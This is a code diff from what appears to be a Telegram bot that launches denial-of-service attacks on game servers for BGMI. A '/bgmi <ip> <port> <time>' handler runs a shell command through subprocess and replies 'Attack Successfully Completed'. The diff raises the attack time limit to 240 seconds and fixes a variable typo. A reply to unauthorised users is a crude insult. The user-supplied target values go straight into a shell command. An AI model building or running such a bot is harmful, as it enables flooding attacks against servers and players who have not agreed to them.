@@ -220,8 +220,8 @@ def handle_bgmi(message):
             ip = command[1]
             port = int(command[2])  
             time = int(command[3])  
-            if time > 181:
-                response = "Error: Time interval must be less than 80."
+            if time > 241:
+                response = "Error: Time interval must be less than 240."
             else:
                 record_command_logs(user_id, '/bgmi_compiled', ip, port, time)
                 log_command(user_id, ip, port, time)
@@ -230,7 +230,7 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"✅ Attack Successfully Completed 🇮🇳 ip: {ip} port: {port} sec: {time}"
         else:
-            rresponse = "✅ Currently Available: /bgmi <ip> <port> <time>"  
+            response = "✅ Currently Available: /bgmi <ip> <port> <time>"  
     else:
         response = " ACCESS VAANGUDA SUNNI PUNDA 🤣."
 
